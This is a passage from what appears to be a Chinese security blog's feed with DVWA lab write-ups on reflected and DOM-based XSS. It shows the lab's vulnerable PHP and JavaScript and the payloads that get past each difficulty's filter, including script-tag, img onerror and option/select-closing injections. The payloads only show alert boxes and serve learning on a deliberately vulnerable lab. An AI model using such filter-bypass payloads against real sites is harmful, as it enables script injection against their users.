&lt;p>好了不说自己了。XSS三个板块感觉没有多少变化，一个&lt;code>img&lt;/code>的payload就能通杀，感觉有点鸡了，缺乏实感，游戏体验略差。&lt;/p>
&lt;p>暂时就这样吧。&lt;/p></description></item><item><title>DVWA上手记录-反射型XSS</title><link>https://nnnewb.github.io/blog/p/get-start-dvwa-10/</link><pubDate>Thu, 28 Apr 2022 16:29:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/get-start-dvwa-10/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>比较简单，快速过。&lt;/p>
&lt;h2 id="原理">原理&lt;/h2>
&lt;p>服务端把用户提交的内容没有做好过滤就渲染到了网页上。只有后端渲染才存在这个问题，前后端分离前端渲染的情况都是 DOM XSS。&lt;/p>
&lt;h2 id="解题">解题&lt;/h2>
&lt;h3 id="收集信息">收集信息&lt;/h3>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-10/image-20220428154827171.png"
width="660"
height="135"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-10/image-20220428154827171_hu2adb11c2fe9b2d42507995e17d6bb15f_12241_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-10/image-20220428154827171_hu2adb11c2fe9b2d42507995e17d6bb15f_12241_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220428154827171"
class="gallery-image"
data-flex-grow="488"
data-flex-basis="1173px"
>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-10/image-20220428154836075.png"
width="660"
height="149"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-10/image-20220428154836075_hua43d3cfbe0c99659da43917ac6fbcaab_12541_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-10/image-20220428154836075_hua43d3cfbe0c99659da43917ac6fbcaab_12541_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220428154836075"
class="gallery-image"
data-flex-grow="442"
data-flex-basis="1063px"
>&lt;/p>
&lt;p>尝试注入一个&lt;code>&amp;lt;b&amp;gt;mike&amp;lt;/b&amp;gt;&lt;/code>。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-10/image-20220428154922489.png"
width="665"
height="151"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-10/image-20220428154922489_huc2c0d0a4afcb0031532bcb3798de4a8d_12727_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-10/image-20220428154922489_huc2c0d0a4afcb0031532bcb3798de4a8d_12727_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220428154922489"
class="gallery-image"
data-flex-grow="440"
data-flex-basis="1056px"
>&lt;/p>
&lt;p>好，直接开干。&lt;/p>
&lt;h3 id="low难度">Low难度&lt;/h3>
&lt;p>直接插一个 &lt;code>script&lt;/code> 就完了。&lt;code>&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-10/image-20220428155023932.png"
width="780"
height="185"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-10/image-20220428155023932_hu4fc9bdce59acefaa676dc166f92e0a8d_8646_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-10/image-20220428155023932_hu4fc9bdce59acefaa676dc166f92e0a8d_8646_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220428155023932"
class="gallery-image"
data-flex-grow="421"
data-flex-basis="1011px"
>&lt;/p>
&lt;h3 id="medium难度">Medium难度&lt;/h3>
&lt;p>尝试&lt;code>&amp;lt;b&amp;gt;mike&amp;lt;/b&amp;gt;&lt;/code>没有过滤，再试&lt;code>&amp;lt;img src=&amp;quot;&amp;quot; onerror=&amp;quot;alert(1)&amp;quot;/&amp;gt;&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-10/image-20220428155154196.png"
width="714"
height="182"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-10/image-20220428155154196_hu21e3d895d30111e19d63cddba4881743_8420_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-10/image-20220428155154196_hu21e3d895d30111e19d63cddba4881743_8420_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220428155154196"
class="gallery-image"
data-flex-grow="392"
data-flex-basis="941px"
>&lt;/p>
&lt;p>已经成功了，再看下代码。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span>
&lt;span class="nx">header&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;X-XSS-Protection: 0&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// Is there any input?
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">array_key_exists&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="s2">&amp;#34;name&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$_GET&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;name&amp;#39;&lt;/span> &lt;span class="p">]&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="k">NULL&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Get input
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$name&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">str_replace&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="s1">&amp;#39;&amp;lt;script&amp;gt;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;name&amp;#39;&lt;/span> &lt;span class="p">]&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="c1">// Feedback for end user
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="s2">&amp;#34;&amp;lt;pre&amp;gt;Hello &lt;/span>&lt;span class="si">${&lt;/span>&lt;span class="nv">name&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;lt;/pre&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>这个情况bypass的方法很多，大小写或者加个空格、多插一个&lt;code>&amp;lt;script&amp;gt;&lt;/code>让服务端替换，都可以。&lt;/p>
&lt;h3 id="high难度">High难度&lt;/h3>
&lt;p>试了下&lt;code>&amp;lt;b&amp;gt;mike&amp;lt;/b&amp;gt;&lt;/code>依然过了，再试一次&lt;code>&amp;lt;img src=&amp;quot;&amp;quot; onerror=&amp;quot;alert(1)&amp;quot;/&amp;gt;&lt;/code>。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-10/image-20220428155519720.png"
width="752"
height="169"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-10/image-20220428155519720_huf5730712bbef9c59b2d9b44311ac2e8e_7890_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-10/image-20220428155519720_huf5730712bbef9c59b2d9b44311ac2e8e_7890_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220428155519720"
class="gallery-image"
data-flex-grow="444"
data-flex-basis="1067px"
>&lt;/p>
&lt;p>又直接过了，行吧&amp;hellip;感觉有点无聊了。再看下代码里怎么防的。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span>
&lt;span class="nx">header&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;X-XSS-Protection: 0&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// Is there any input?
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">array_key_exists&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="s2">&amp;#34;name&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$_GET&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;name&amp;#39;&lt;/span> &lt;span class="p">]&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="k">NULL&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Get input
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$name&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">preg_replace&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="s1">&amp;#39;/&amp;lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;name&amp;#39;&lt;/span> &lt;span class="p">]&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="c1">// Feedback for end user
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="s2">&amp;#34;&amp;lt;pre&amp;gt;Hello &lt;/span>&lt;span class="si">${&lt;/span>&lt;span class="nv">name&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;lt;/pre&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>这正则就有点离谱了=。= 如何构造一个能被这个正则替换过之后还有效的东西呢。然后就想到了转义。&lt;/p>
&lt;p>&lt;code>&amp;lt;&amp;amp;#x73&amp;amp;#x63&amp;amp;#x72&amp;amp;#x69&amp;amp;#x70&amp;amp;#x74&amp;gt;alert(1)&amp;lt;/&amp;amp;#x73&amp;amp;#x63&amp;amp;#x72&amp;amp;#x69&amp;amp;#x70&amp;amp;#x74&amp;gt;&lt;/code>&lt;/p>
&lt;p>但是不行。想了想没有什么太好的办法，毕竟只要顺序出现&lt;code>&amp;lt;script&lt;/code>这些字符就会被淦，而且是整个被淦，在tag中间加tag的办法也行不通。最后想想还是对啊，干嘛非揪着 &lt;code>script&lt;/code> 不放。不用&lt;code>&amp;lt;script&lt;/code>还是有大把的 payload 可以用。&lt;/p>
&lt;p>想想这个过滤还是挺离谱的，目前见过的XSS过滤方法基本都是替换掉了 &lt;code>&amp;lt;&amp;gt;()&lt;/code> 这些字符，反正构造不出函数调用和HTML标签。&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>找个更好玩的 XSS 靶场的念头开始增强了。不过多少还有点担心 XSS 漏洞未来会不会退出主流（好像现在就有点退出主流的意思了），学了能不能涨点身价什么的&amp;hellip;想太多。&lt;/p>
&lt;p>没有特别好总结的，利用&lt;code>script&lt;/code>或者别的标签执行 js 就完了。&lt;/p></description></item><item><title>DVWA上手记录-DOM型XSS</title><link>https://nnnewb.github.io/blog/p/get-start-dvwa-09/</link><pubDate>Thu, 28 Apr 2022 15:17:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/get-start-dvwa-09/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>终于做到了XSS题。先尝试把DOM型XSS做完。&lt;/p>
&lt;h2 id="原理">原理&lt;/h2>
&lt;p>用JavaScript操作dom的时候没对用户数据做好过滤，导致将用户数据当HTML/JS解释执行。&lt;/p>
&lt;h2 id="解题">解题&lt;/h2>
&lt;h3 id="low难度收集信息">Low难度：收集信息&lt;/h3>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-09/image-20220428135841918.png"
width="236"
height="174"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-09/image-20220428135841918_hu4fb8acd7cd0e49d8c64eccde34f353bf_9510_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-09/image-20220428135841918_hu4fb8acd7cd0e49d8c64eccde34f353bf_9510_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220428135841918"
class="gallery-image"
data-flex-grow="135"
data-flex-basis="325px"
>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-09/image-20220428135846382.png"
width="326"
height="80"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-09/image-20220428135846382_hu3d7c42dc8f2c0cf2c4d6f3ffa934d4b8_3878_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-09/image-20220428135846382_hu3d7c42dc8f2c0cf2c4d6f3ffa934d4b8_3878_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220428135846382"
class="gallery-image"
data-flex-grow="407"
data-flex-basis="978px"
>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-09/image-20220428140052002.png"
width="829"
height="388"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-09/image-20220428140052002_hue2c37b2d3cde1cbe15c826517758417d_53138_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-09/image-20220428140052002_hue2c37b2d3cde1cbe15c826517758417d_53138_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220428140052002"
class="gallery-image"
data-flex-grow="213"
data-flex-basis="512px"
>&lt;/p>
&lt;p>所有值得关注的东西就是这些。&lt;/p>
&lt;p>目标是获取用户的 Cookie。这里就尝试发起一个 CSRF攻击。&lt;/p>
&lt;h3 id="low难度解题">Low难度：解题&lt;/h3>
&lt;p>两个写入DOM的地方，一个是 &lt;code>+ lang +&lt;/code>，一个是 &lt;code>decodeURI(lang)&lt;/code>。&lt;code>decodeURI&lt;/code>更好操作一些，尝试注入一个合法标签，直接写&lt;code>&amp;lt;script&amp;gt;alert(1);&amp;lt;/script&amp;gt;&lt;/code>。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-09/image-20220428142334193.png"
width="753"
height="193"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-09/image-20220428142334193_hu801ceb6c161db13b4cd89d95d6a0474a_6915_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-09/image-20220428142334193_hu801ceb6c161db13b4cd89d95d6a0474a_6915_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220428142334193"
class="gallery-image"
data-flex-grow="390"
data-flex-basis="936px"
>&lt;/p>
&lt;p>注入成功。&lt;/p>
&lt;h3 id="medium难度解题">Medium难度：解题&lt;/h3>
&lt;p>惊了，看起来js没变化。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-js" data-lang="js">&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">location&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">href&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">indexOf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;default=&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">&amp;gt;=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="kd">var&lt;/span> &lt;span class="nx">lang&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">location&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">href&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">substring&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">location&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">href&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">indexOf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;default=&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">write&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;&amp;lt;option value=&amp;#39;&amp;#34;&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="nx">lang&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="s2">&amp;#34;&amp;#39;&amp;gt;&amp;#34;&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="nb">decodeURI&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">lang&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="s2">&amp;#34;&amp;lt;/option&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">write&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;&amp;lt;option value=&amp;#39;&amp;#39; disabled=&amp;#39;disabled&amp;#39;&amp;gt;----&amp;lt;/option&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">write&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;&amp;lt;option value=&amp;#39;English&amp;#39;&amp;gt;English&amp;lt;/option&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">write&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;&amp;lt;option value=&amp;#39;French&amp;#39;&amp;gt;French&amp;lt;/option&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">write&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;&amp;lt;option value=&amp;#39;Spanish&amp;#39;&amp;gt;Spanish&amp;lt;/option&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">write&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;&amp;lt;option value=&amp;#39;German&amp;#39;&amp;gt;German&amp;lt;/option&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>尝试用Low难度的payload，发现被跳转：&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-09/image-20220428142754536.png"
width="661"
height="109"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-09/image-20220428142754536_hua8a7f30740a75850eeb95c63d8fbbf4c_10513_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-09/image-20220428142754536_hua8a7f30740a75850eeb95c63d8fbbf4c_10513_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220428142754536"
class="gallery-image"
data-flex-grow="606"
data-flex-basis="1455px"
>&lt;/p>
&lt;p>大概是做了过滤，虽然有网上随便找的一堆 xss payload 但不想无脑试过去。看一眼源码。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">
&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span>
&lt;span class="c1">// Is there any input?
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="nx">array_key_exists&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="s2">&amp;#34;default&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$_GET&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="o">!&lt;/span>&lt;span class="nx">is_null&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;default&amp;#39;&lt;/span> &lt;span class="p">])&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nv">$default&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;default&amp;#39;&lt;/span>&lt;span class="p">];&lt;/span>
&lt;span class="c1"># Do not allow script tags
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">stripos&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nv">$default&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;&amp;lt;script&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">!==&lt;/span> &lt;span class="k">false&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">header&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;location: ?default=English&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">exit&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>一个很鸡的过滤，&lt;code>stripos&lt;/code>忽略大小写所以大小写 bypass 不行，一次 URI 编码也不行。考虑不用 &lt;code>script&lt;/code> 标签，直接把 &lt;code>option&lt;/code>和&lt;code>select&lt;/code> 标签闭合了，然后插一个别的标签比如&lt;code>img&lt;/code>。&lt;/p>
&lt;p>payload就改成这样。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-html" data-lang="html">&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">option&lt;/span>&lt;span class="p">&amp;gt;&amp;lt;/&lt;/span>&lt;span class="nt">select&lt;/span>&lt;span class="p">&amp;gt;&amp;lt;&lt;/span>&lt;span class="nt">img&lt;/span> &lt;span class="na">src&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;&amp;#34;&lt;/span> &lt;span class="na">onerror&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">alert(1)&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-09/image-20220428144330839-16511282123961.png"
width="761"
height="166"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-09/image-20220428144330839-16511282123961_hu65f6cd5bc521de2989168b02384fe0f3_8138_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-09/image-20220428144330839-16511282123961_hu65f6cd5bc521de2989168b02384fe0f3_8138_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220428144330839"
class="gallery-image"
data-flex-grow="458"
data-flex-basis="1100px"
>&lt;/p>
&lt;p>也暴力解开了。&lt;/p>
&lt;h3 id="high难度解题">High难度：解题&lt;/h3>
&lt;p>还是直接试一次刚才的payload，果不其然302了。看看代码。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span>
